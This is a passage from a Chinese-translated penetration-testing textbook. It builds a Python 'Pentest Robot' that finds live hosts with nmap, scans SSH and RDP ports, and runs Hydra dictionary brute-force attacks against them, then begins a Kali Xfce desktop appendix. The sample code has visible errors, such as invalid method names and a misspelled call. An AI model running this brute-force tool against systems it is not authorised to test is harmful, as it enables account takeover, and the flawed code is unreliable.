  \n图 18.1 工作流\n\n## Python 软件包\n\n在我们开始开发此应用程序之前，让我们来看一个通过命令行安装 Python 软件包的技巧。Python\
  \ 使用 `pip` 来安装包（类似于 `apt` 包管理器，但专门针对 Python）。由于我们在本章中将使用 `Python3`，你需要在你的 Kali 系统上安装\
  \ `pip3`（到目前为止，如果你在命令行中使用 `pip`，Kali 将安装 Python2 包）。要安装 `pip3`，请执行以下两个命令：\n\n```\n\
  \ $ apt update\n$ apt install python3-pip\n```\n\n例如，`yapf` 是一个 Python 格式化工具，帮助帮助格式化\
  \ Python 源代码（用于整洁代码开发）。在 Kali 上安装它，你可以使用 `pip3` 完成任务，如下所示：\n\n```\nroot@kali:~#\
  \ pip3 install yapf\n```\n\n每当你想要使用新包时，VS Code 都会使用 `pip3` 安装它（你可以在 VS Code 中使用\
  \ `yapf` 格式化你的 Python 代码）。因此，在开发完整的应用程序（如我们在本章中构建的程序）之前，你需要先安装 `pip3`。\n\n## 应用程序启动\n\
  \n在本节中，我们将开始创建此应用程序。我们将根据图 18.1 中的工作流图创建每个部分。第一步是打印横幅，并确保用户理解他们需要输入什么。\n\nPython\
  \ 中有一种我们在上一章中没有介绍过的技巧。这个条件（`if` 语句）在应用程序加载之初被调用。事实上，这就是我们要插入启动任务的地方。`if` 语句的格式如下：\n\
  \n```\nif __name__ == '__main__':\n   [在此处，你添加首次运行的脚本]\n```\n\n不要担心；你将在接下来的示例中理解它是如何工作的。我们将所有的加载逻辑都放在这个条件内部（因为我们需要它们先执行）：\n\
  \n```python\n#!/usr/bin/python3\n\nif __name__ == '__main__':\n    \"\"\"\n    这是首次调用应用程序的地方\n\
  \    \"\"\"\n\n # 打印横幅\n print(\"Welcome To Pentest Robot\")\n print(\"###########################\"\
  )\n print(\"Enter a single IP or Range in CIDR format (e.g. 192.168.0.0/24):\")\n\
  \n # 用户输入\n cidr_input = input(\"IP/CIDR>\")\n print (cidr_input)\n```\n\n保存脚本并将其命名为\
  \ `pentest_robot.py`。该脚本的输出如下（注意我正在使用 Visual Studio Code 运行它）：\n\n```\nWelcome To\
  \ Pentest Robot\n###########################\nEnter a single IP or Range in CIDR\
  \ format (e.g. 192.168.0.0/24):\nIP/CIDR>172.16.0.1\n172.16.0.1\n```\n\n## 输入验证\n\
  \n现在是处理应用程序工作流图中的第二步了，即输入验证。用户将输入单个 IP 地址或 CIDR 格式的范围。有一个 Python 模块可以处理这种验证——`ipaddress.py`——你必须从以下\
  \ URL 下载它并保存到相同的应用程序目录下：\n\n[raw.githubusercontent.com/python/cpython/3.9/Lib/ipaddress.py](http://raw.githubusercontent.com/python/cpython/3.9/Lib/ipaddress.py)\n\
  \n接下来，使用以下行导入此模块：\n\n```python\nfrom ipaddress import ip_network\n```\n\n由于我们将使用\
  \ `ip_network` 方法，请使用导入语法来实现它。这种模式将避免我们在脚本中重复使用相同的语法 `ip_network`：\n\n```python\n\
  #!/usr/bin/python3\nfrom ipaddress import ip_network\n\ndef validate_input(cidr_input):\n\
  \    \"\"\"\n    验证用户输入 - IP 地址 CIDR 格式\n    \"\"\"\n    hosts = []\n    try:\n\
  \        hosts = list(ip_network(cidr_input).hosts())\n    except:\n        print('Invalid\
  \ input! A valid CIDR IP range example: 192.168.0.0/24')\n        return None\n\n\
  \    return hosts\n\nif __name__ == '__main__':\n    \"\"\"\n    这是首次调用应用程序的地方\n\
  \    \"\"\"\n\n     # 打印横幅\n    print(\"Welcome To Pentest Robot\")\n    print(\"\
  ###########################\")\n    print(\"Enter a single IP or Range in CIDR format\
  \ (e.g. 192.168.0.0/24):\")\n\n     # 用户输入\n    cidr_input = input(\"IP/CIDR>\"\
  )\n    hosts = validate_input(cidr_input)\n```\n\n为了质量保证，让我们测试这三种情况：\n\n*   单个 IP\
  \ 输入\n*   有效的 CIDR 范围输入\n*   无效的 CIDR 范围输入\n\n**场景 1**：单个 IP（无错误）：\n\n```\nWelcome\
  \ To Pentest Robot\n###########################\nEnter a single IP or Range in CIDR\
  \ format (e.g. 192.168.0.0/24):\nIP/CIDR>172.16.0.1\n```\n\n**场景 2**：有效的 IP 范围（无错误）：\n\
  \n```\nWelcome To Pentest Robot\n###########################\nEnter a single IP\
  \ or Range in CIDR format (e.g. 192.168.0.0/24):\nIP/CIDR>172.16.0.0/24\n```\n\n\
  **场景 3**：无效的 CIDR 格式（预期打印错误消息）：\n\n```\nWelcome To Pentest Robot\n###########################\n\
  Enter a single IP or Range in CIDR format (e.g. 192.168.0.0/24):\nIP/CIDR>172.16.0.1/24\n\
  Invalid input! A valid CIDR IP range example: 192.168.0.0/24\n```\n\n## 代码重构\n\n\
  代码重构方法将确保避免糟糕的编程实践（如在多处复制相同的代码等）。程序员每天都在讨论这个，因此他们开发整洁的源代码。我们如何将这一原则应用于我们的应用程序？在这个阶段，我们可以预测两个需要集中处理以避免重复：\n\
  \n1.  我们需要在多个处打印分隔符。\n2.  我们需要在多个处执行命令。\n\n我们将创建一个名为 `UTILITIES` 的类对象并添加两个方法来涵盖这两个场景：\n\
  \n```python\nimport subprocess\nclass UTILITIES:\n   def __init__(self):\n     \
  \     \"\"\"\n          类构造函数\n          \"\"\"\n\n  def separator_line(self): return\
  \ \"################################\"\n\n  def execute_command(self, cmd):\n  \
  \        \"\"\"\n  此函数将执行终端窗口命令\n          \"\"\"\n          #声明命令输出变量\n       \
  \   cmd_output = \"\"\n\n  try:\n          cmd_output = subprocess.check_output(cmd,shell=True,\
  \ stderr=subprocess.STDOUT)\n          cmd_output = cmd_output.decode(\"utf-8\"\
  )\n          cmd_output += \"\\n%s\\n\" % self.seperator_line()\n  except Exception\
  \ as e:\n          print(str(e))\n          print(\"Error -无法执行 the cmd: %s\" %\
  \ cmd)\n  finally:\n  return cmd_output\n```\n\n## 扫描活跃主机\n\n工作流图中的下一步是检查活跃主机。我们将使用\
  \ Nmap 根据用户的输入（单个 IP 还是范围）来完成任务。\n\n\n\n\n\n```python\nclass HostScan:\n def __init__(self,\
  \ host_ip):\n  \"\"\"\n  类构造函数\n  \"\"\"\n  self.host_ip = host_ip\n  self.util\
  \ = UTILITIES()\n\n  def is_host_live(self):\n  \"\"\"\n  检查主机是否在网络上上线并运行\n  \"\"\
  \"\n  nmap_cmd = \"nmap -sn %s\" % self.host_ip\n  nmap_output = self.util.execute_command(nmap_cmd)\n\
  \  if (\"1 host up\" in nmap_output):\n   print(\"[+] %s is up\" % self.host_ip)\n\
  \   return True\n  else:\n   return False\n\ndef validate_input(cidr_input):\n \
  \ \"\"\"\n  验证用户输入 - IP 地址 CIDR 格式\n  \"\"\"\n  hosts = []\n  try:\n   hosts = list(ip_network(cidr_input).hosts())\n\
  \  except:\n   print('输入无效！一个的 CIDR IP 范围示例: 192.168.0.0/24')\n   return None\n\n\
  \  return hosts\n\nif __name__ == '__main__':\n  \"\"\"\n  这是应用程序首次被调的地方\n  \"\"\
  \"\n  util = UTILITIES()\n\n  # 打印 Banner\n  print(\"Welcome To Pentest Robot\"\
  )\n  print(util.separator_line())\n  print(\"Enter a single IP or Range in CIDR\
  \ format (e.g. 192.168.0.0/24):\")\n\n  # 用户输入\n  cidr_input = input(\"IP/CIDR>\"\
  )\n  hosts = validate_input(cidr_input)\n\n  # 如果 CIDR 值有效\n  if (hosts != None):\n\
  \   print(\"\\n[i] Checking for Live Hosts…\")\n   LIVE_HOSTS = []\n   for host\
  \ in hosts:\n    scanner = HostScan(host)\n    if (scanner.is_host_live()):\n  \
  \    LIVE_HOSTS.append(host)\n   print (LIVE_HOSTS)\n```\n\n为了测试这段新代码，我们将实现以下两个测试用例：\n\
  \n- 使用单个 IP 地址（正在运行的）\n- 使用 IP 地址范围（整个子网）\n\n### 场景 1（预期：主机在线）：\n\n```\n Welcome\
  \ To Pentest Robot\n################################################\nEnter a single\
  \ IP or Range in CIDR format (e.g. 192.168.0.0/24):\nIP/CIDR>172.16.0.1\n\n[i] Checking\
  \ for Live Hosts…\n[+] 172.16.0.1 is up\n[IPv4Address('172.16.0.1')]\nroot@kali:~#\n\
  ```\n\n### 场景 2（预期：正确检测到网络中的在线主机）：\n\n```\n Welcome To Pentest Robot\n################################################\n\
  Enter a single IP or Range in CIDR format (e.g. 192.168.0.0/24):\nIP/CIDR>172.16.0.0/24\n\
  \n[i] Checking for Live Hosts…\n[+] 172.16.0.1 is up\n[+] 172.16.0.2 is up\n[+]\
  \ 172.16.0.100 is up\n[+] 172.16.0.103 is up\n[+] 172.16.0.107 is up\n[IPv4Address('172.16.0.1'),\
  \ IPv4Address('172.16.0.2'), IPv4Address('172.16.0.100'), IPv4Address('172.16.0.103'),\
  \ IPv4Address('172.16.0.107')]\nroot@kali:~# \n```\n\n#### 端口与服务扫描\n\n在此阶段，我们已经获得了一个在线主机的\
  \ IP 地址列表。接下来，我们将对上一步找到每个在线主机进行端口扫描，并寻找两个开放端口：22 和 3389。这一步的另一个挑战是格式化 Nmap 扫描输出。我们将为此目的创建一个函数，它将返回一个自定义服务对象的列表（`ServiceDTO`）。总而言之，以下是我们在这一步中实现的内容：\n\
  \n1. 在 `HostScan` 类内部创建一个方法（名为 `port_scan`），用于扫描开放端口 22 和 3389。\n2. 创建第二个方法（名为 `parse_nmap_output`），它将分析\
  \ Nmap 的端口扫描输出并返回自定义服务项列表（`ServiceDTO`）。\n3. 创建一个名为 `serviceDTO` 的类（DTO 代表数据传输对象），它将用于用于上一个方法的返回值。\n\
  4. 最后，从应用程序的主部分调用端口扫描方法。\n\n首先，在 `HostScan` 类内部创建这两个方法：\n\n```python\nclass HostScan:\n\
  \ def __init__(self, host_ip):\n  \"\"\"\n  类构造函数\n  \"\"\"\n  self.host_ip = host_ip\n\
  \  self.util = UTILITIES()\n\n  def is_host_live(self):\n  \"\"\"\n  检查主机是否在网络上上线并运行\n\
  \  \"\"\"\n  nmap_cmd = \"nmap -sn %s\" % self.host_ip\n  nmap_output = self.util.execute_command(nmap_cmd)\n\
  \  if (\"1 host up\" in nmap_output):\n   print(\"[+] %s is up\" % self.host_ip)\n\
  \   return True\n  else:\n   return False\n\n  def port_scan(self):\n  \"\"\"\n\
  \  对主机端口扫描扫描同时也添加版本扫描以获取有关服务的信息。\n  \"\"\"\n  print(\"[i] Starting Nmap port scan\
  \ on host %s\" % self.host_ip)\n  nmap_cmd = \"nmap -sV -p 22,3389 --open %s\" %\
  \ self.host_ip\n\n  nmap_output = self.util.execute_command(nmap_cmd)\n  return\
  \ nmap_output\n\n  def parse_nmap_output(self, nmap_output):\n  \"\"\"\n  解析 nmap\
  \ 结果\n  \"\"\"\n  service_names_list = {}\n  nmap_output = nmap_output.split(\"\\\
  n\")\n  for output_line in nmap_output:\n   output_line = output_line.strip()\n\
  \   services_list = []\n   # 如果端口是开放的\n   if (\"tcp\" in output_line) and (\"open\"\
  \ in output_line) and not (\"Discovered\" in output_line):\n    # 清理空格\n    output_line\
  \ = output_line.replace(\" \", \" \")\n    # 分割行\n    output_line_split = output_line.split(\"\
  \ \")\n    # 分割的第三部分是服务名\n    service_name = output_line_split[2]\n    # 分割的第一部分是端口号\n\
  \    port_number = output_line_split[0]\n\n    # 获取服务描述\n    output_line_split_length\
  \ = len(output_line_split)\n    end_position = output_line_split_length - 1\n  \
  \  current_position = 3\n    service_description = ''\n    while current_position\
  \ <= end_position:\n     service_description += ' ' + output_line_split[current_position]\n\
  \     current_position += 1\n\n    # 创建服务\n    service = ServiceDTO(port_number,\
  \ service_name)\n    # 如果已经在不同的端口上添加新服务\n    if service_name in service_list:\n\
  \     # 获取保存的对象\n     services_list = service_names_list[service]\n    services_list.append(service)\n\
  \    print(\"[+] Port: %s, Service: %s\" % (service.port, service.name))\n    service_names_list[service]\
  \ = services_list\n\n  return service_names_list\n```\n\n其次，创建 DTO 类；此对象将包含 nmap\
  \ 扫描后的值：\n\n```python\nclass ServiceDTO:\n  \"\"\"\n  nmap 扫描后的值\n  \"\"\"\n  def\
  \ __init__(self, port, name):\n   self.port = port\n   self.name = name\n```\n\n\
  最后，从应用程序的主部分调用端口扫描方法：\n\n```python\nif __name__ == '__main__':\n  \"\"\"\n  这是应用程序首次被调的地方\n\
  \  \"\"\"\n  util = UTILITIES()\n\n  # 打印 Banner\n  print(\"Welcome To Pentest Robot\"\
  )\n  print(util.separator_line())\n  print(\"Enter a single IP or Range in CIDR\
  \ format (e.g. 192.168.0.0/24):\")\n\n  # 用户输入\n  cidr_input = input(\"IP/CIDR>\"\
  )\n  hosts = validate_input(cidr_input)\n\n  # 如果 CIDR 值有效\n  if (hosts != None):\n\
  \   print(\"\\n[i] Checking for Live Hosts…\")\n   LIVE_HOSTS = []\n   for host\
  \ in hosts:\n    scanner = HostScan(host)\n    if (scanner.is_host_live()):\n  \
  \    LIVE_HOSTS.append(host)\n\n  # 如果我们有在线主机\n  if (len(LIVE_HOSTS) > 0):\n   \
  \ for live_host in LIVE_HOSTS:\n      scanner_live_hosts = HostScan(live_host)\n\
  \      port_scan_results = scanner_live_hosts.port_scan()\n      parsed_nmap_results\
  \ = scanner_live_hosts.parse_nmap_output(port_scan_results)\n```\n\n是时候测试它了。我们将使用一个测试用例（使用\
  \ IP 地址范围），我们已经知道了每一个服务。目标是测试端口扫描结果的准确性：\n\n```\n Welcome To Pentest Robot\n################################################\n\
  Enter a single IP or Range in CIDR format (e.g. 192.168.0.0/24):\nIP/CIDR>172.16.0.0/24\n\
  \n[i] Checking for Live Hosts…\n[+] 172.16.0.1 is up\n[+] 172.16.0.2 is up\n[+]\
  \ 172.16.0.100 is up\n[+] 172.16.0.103 is up\n[+] 172.16.0.107 is up\n\n[i] Starting\
  \ Nmap port scan on host 172.16.0.1\n[i] Starting Nmap port scan on host 172.16.0.2\n\
  [+] Port: 3389, Service: ms-wbt-server\n[i] Starting Nmap port scan on host 172.16.0.100\n\
  [+] Port: 3389, Service: tcpwrapped\n[i] Starting Nmap port scan on host 172.16.0.103\n\
  [i] Starting Nmap port scan on host 172.16.0.107\n[+] Port: 22, Service: ssh\n```\n\
  \n#### 攻击凭据并保存结果\n\n\n\n\n\n这是该应用程序的最后一个阶段。在此阶段中，我们将对端口扫描步骤中的服务进行字典攻击。如你所见，我们正在逻辑性地遵循图\
  \ 18.1 中的工作流图。我们将此阶段的开始称为*枚举*（这个名称比*攻击*一词听起来更温和），并且不再称之为*字典攻击*，而是称之为*暴力破解阶段*。以下是我们在最后一步中将使用的主要函数：\n\
  \n1. 创建名为 `EnumerateHost` 的类。\n2. 在上一个类内部创建一个方法（命名为 `start`），启动攻击阶段。\n3. 在同一类中添加一个暴力破解方法，它将使用\
  \ `Hydra` 运行字典攻击。该函数将使用自定义的用户名和密码字典文件（保存在 `resources` 文件夹内）。\n4. 添加一个最终方法，将此字典攻击的结果保存到\
  \ `reports` 目录下的文件中（我们可以将每个主机机的结果保存到不同的文件中）。\n5. 最后，在应用程序的主部分调用 `EnumerateHost`\
  \ 类的方法。\n\n首先，创建 `EnumerateHost` 类及其方法。同时，导入附加的 `os` 模块：\n\n```python\n import os\n\
  class EnumerateHost:\n def __init__(self, nmap_results, host_ip):\n  \"\"\"\n  类构造函数\n\
  \  \"\"\"\n  self.nmap_results = nmap_results\n  self.host_ip = host_ip\n  self.util\
  \ = UTILITIES()\n\n  def start(self):\n  \"\"\"\n  启动枚举过程\n  \"\"\"\n  output =\
  \ ''\n  for service:name in self.nmap_results:\n   if service:name == \"ssh\":\n\
  \      output += self.bruteforce:ssh()\n   elif \"ms-wbt-server\" in service:name:\n\
  \      output += self.bruteforce:rdp()\n\n  self.save_results(output, './reports',\
  \ str(self.host_ip) + \".txt\")\n\n  def bruteforce:ssh(self):\n  \"\"\"\n  暴力破解\
  \ SSH 目标\n  \"\"\"\n  print(\"[i] Starting SSH Brute-Force on host %s\" % self.host_ip)\n\
  \  cmd = 'hydra -t 10 -e nsr -L ./resources/common_users.txt -P ./resources/common_passwords.txt\
  \ ssh://' + str(self.host_ip)\n  output = self.util.execute_command(cmd)\n  return\
  \ output\n\n  def bruteforce:rdp(self):\n  \"\"\"\n  暴力破解 RDP 目标\n  \"\"\"\n  print(\"\
  [i] Starting RDP Brute-Force on host %s\" % self.host_ip)\n  cmd = 'hydra -t 10\
  \ -e nsr -L ./resources/common_users.txt -P ./resources/common_passwords.txt rdp://'\
  \ + str(self.host_ip)\n\n  output = self.util.execute_command(cmd)\n  return output\n\
  \n  def save_results(self, results, folder_name, file_name):\n  \"\"\"\n  将数据保存到文件\n\
  \  \"\"\"\n  try:\n   # 将结果保存到文件夹/文件\n   file_name_path = folder_name + \"/\" +\
  \ file_name\n\n   # 如果文件夹不存在则创建它\n   if not os.path.isdir(folder_name):\n    os.mkdir(folder_name)\n\
  \n   # 如果内容为空则退出此函数\n   if (len(results) == 0):\n    return\n\n   # 创建文件对象\n   file_to_save\
  \ = open(file_name_path, 'w')\n   # 写入更改\n   file_to_save.write(results)\n   # 关闭文件对象\n\
  \   file_to_save.close()\n  except:\n   print(\"[!] Error: Cannot save the results\
  \ to a file\")\n```\n\n其次，在应用程序的主部分调用类方法。同时，我们还将为主部分添加一些最后的完善：\n\n```python\n if\
  \ __name__ == '__main__':\n  \"\"\"\n  这是首次调用应用程序的地方\n  \"\"\"\n  util = UTILITIES()\n\
  \n  # 打印横幅\n  print(\"Welcome To Pentest Robot\")\n  print(util.separator_line())\n\
  \  print(\"输入单个 IP 或 CIDR 格式的范围 (例如 192.168.0.0/24):\")\n\n  # 用户输入\n  cidr_input\
  \ = input(\"IP/CIDR>\")\n  hosts = validate_input(cidr_input)\n\n  # 如果 CIDR 值有效\n\
  \  if (hosts != None):\n   print(\"\\n[i] 正在检查活跃主机…\")\n   LIVE_HOSTS = []\n   for\
  \ host in hosts:\n    scanner = HostScan(host)\n    if (scanner.is_host_live()):\n\
  \      LIVE_HOSTS.append(host)\n\n   print(\"\\n\")\n   # 如果我们有活跃主机\n   if (len(LIVE_HOSTS)>\
  \ 0):\n    for live_host in LIVE_HOSTS:\n      scanner_live_hosts = HostScan(live_host)\n\
  \      port_scan_results = scanner_live_hosts.port_scan()\n      parsed_nmap_results\
  \ = scanner_live_hosts.parse_nmap_output(port_scan_results)\n      enum = EnumerateHost(parsed_nmap_results,\
  \ live_host)\n      enum.start()\n      print(util.seperator_line())\n   else:\n\
  \    print(\"[!] 没有可扫描的活跃主机\")\n\n  print (\"\\n[*] Pentest Robot 完成执行!\")\n```\n\
  \n记住，你可以在 GitHub 上下载此应用程序的完整源代码 [github.com/GusKhawaja/PentestRobot](http://github.com/GusKhawaja/PentestRobot)。\n\
  \n### 总结\n\n接下来要做什么？你是艺术家，从现在开始你应该能够创建自己的应用程序。本章的主要目标是开阔视野，鼓励你成为下一个 Python 应用程序的创造者。\n\
  \n理想情况下，这本书让你对自己的渗透测试员职业生涯充满信心。\n\n# 附录 A\n\nKali Linux 桌面概览\n\n在写作期间，Kali Linux\
  \ 的最新版本是 `2020.1`。此版本的 Kali 引入了一些新功能，本附录涵盖了这些功能。需要注意的是，任何未来的发布都会带来一些新变化，但始终要认为变化是更好的，不要害怕变化。\n\
  \n在执行任务期间，我大部分时间使用 Kali Linux 系统，很少为此目的使用 Microsoft Windows 操作系统。即使是黑客（坏人）也使用 Kali\
  \ Linux 工具完成工作。\n\n本附录侧重于如何管理 Kali Linux 桌面环境的界面。你将学习如何轻松处理此操作系统并根据你的喜好进行定制。注意，本附录将涵盖\
  \ Kali Linux `2020` 及更高版本，因此本附录中的主要课程基于 Xfce 桌面环境。\n\n以下是本附录涵盖的内容：\n\n* 下载并运行 Kali\
  \ Linux 虚拟机\n* 使用 Xfce 桌面菜单\n* 掌握 Kali Xfce 系统的配置设置\n* 更改你的 Kali 环境的外观\n* 从头安装 Kali\
  \ Linux\n\n## 下载并运行 Kali Linux 虚拟机\n\n你需要做的第一件事是在以下链接下载 Kali Linux 的虚拟机副本：\n\n[www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/](http://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)\n\
  \n在此页面上，你有三个下载选项可供选择：\n\n* 适用于 VMware 的 32/64 位 Kali VM\n* 适用于 VirtualBox 的 32/64\
  \ 位 Kali VM\n* 适用于 Hyper-V 的 64 位 Kali VM\n\n一旦下载了虚拟机，解压缩文件并使用你选择的虚拟机程序打开内容。在本附录的末尾，你将学习如何使用\
  \ ISO 镜像从头安装 Kali。（建议在物理主机上安装 Kali。）此外，在附录 B 中，我将向你展示如何作为 Docker 容器运行 Kali Linux。目前，只需下载\
  \ Kali 的虚拟机副本，以便跟随本附录并进行练习（不要跳过）。\n\n### 虚拟机首次启动\n\n一旦启动 Kali Linux 虚拟机副本，你将看到加载菜单，如图\
  \ A.1 所示。选择 `Kali GNU/Linux` 并按 `Enter`。（如果不按任何键也没关系；几秒后将默认选择此项。）\n\n![在加载菜单上选择\
  \ Kali/Linux 的截图](img/bapp01f001.png)\n\n图在加载菜单上选择 Kali/Linux\n\n在旧版本的 Kali Linux\
  \ 中，默认密码是 `root/toor`。从此版本（2020.1）开始，Offensive Security（Kali Linux 的制作者）引入了非 root\
  \ 用户。因此，用户名是 `kali`，密码也是 `kali`。\n\n## Kali Xfce Desktop\n\n截至 Kali Linux 最新版本（2020.1），Xfce\
  \ 是默认桌面环境。在本节中，你将学习如何更改 Xfce 桌面的外观和感受，以便你创建自己的环境。\n\n在此发布之前，Gnome 是默认桌面环境，如果你想回到它，不用担心；如果你是从\
  \ ISO 镜像安装的 Kali，你仍然可以在菜单中选择它，如图 A.2 所示。\n\n![Xfce 安装选项的截图](img/bapp01f002.png)\n\
  \n图 Xfce 安装选项\n\n\n\n\n\n图 A.2 Xfce 安装选项\n\nXfce 桌面环境的趣味之处在于它是轻量级的且运行非常快，即使在系统资源较低的设备上也是如此。除此之外，你还拥有一个完全自定义、外观精美的操作系统，如图图\
  \ A.3 所示。\n\n![Kali 桌面截图。](img/bapp01f003.png)\n\n图 A.3 Kali 桌面\n\n# Kali Xfce 菜单\n\
  \nKali 中的 Xfce 桌面使用 Whisker 菜单为你提供愉快的（轻量级）用户体验。让我们先发现菜单的主要区域，如图图 A.4 所示。\n\n## 搜索栏\n\
  \n搜索栏搜索应用程序的快速方法。它不仅限于搜索应用程序。以下是它还可以做的事情：\n\n*   通过在搜索内容前加上 `#` 字符搜索 Linux man 页（例如，`#ls`）\n\
  *   通过在搜索内容前加上 `?` 字符搜索网络（例如，`?Kali Linux`）\n*   通过在搜索标准前加上 `!w` 搜索维基百科（例如，`!w ethical\
  \ hacking`）\n*   通过在命令前加上 `!` 字符在终端窗口中运行命令（例如，`!reboot`，如果你不是 root 用户则使用 `!sudo\
  \ reboot`）\n\n## 收藏菜单项\n\n在图 A.4 中，你可以看到从菜单中选择了“收藏”菜单项，在面板的右侧，你可以看到它的内容。\n\n![Kali\
  \ 菜单截图。](img/bapp01f004.png)\n\n图 A.4 Kali 菜单\n\n如果你想从此列表中删除任何项目，请右键点击该项目并选择“从收藏中移除”，如图图\
  \ A.5 所示。\n\n![从收藏中移除截图。](img/bapp01f005.png)\n\n图 A.5 从收藏中移除\n\n如果你想向收藏菜单添加新项目，请先使用搜索栏查找你的应用（例如，`nmap`），然后右键点击并选择“添加到收藏”，如图图\
  \ A.6 所示。\n\n![添加到收藏截图。](img/bapp01f006.png)\n\n图 A.6 添加到收藏\n\n## 常用应用程序\n\n如果你从菜单中选择“常用应用程序”，你将看到所有与渗透测试无关的应用程序（例如，图像查看器、网络浏览器等）。虽然并非所有的应用程序都此无关，但此列表中有几个例外：Ettercap、King\
  \ Phisher 和 XHydra。\n\n以下是你在列表中找到的工具：\n\n*   辅助工具 (Accessories)\n    *   **Application\
  \ Finder**：在 Kali 上查找并启动应用程序\n    *   **Bulk Rename**：重命名多个文件\n    *   **Cherry\
  \ Tree**：分级记笔记应用\n    *   **Clipman**：剪贴板管理器；运行它后，剪贴板将出现在面板右上角（这里你将看到所有复制的项目）\n\
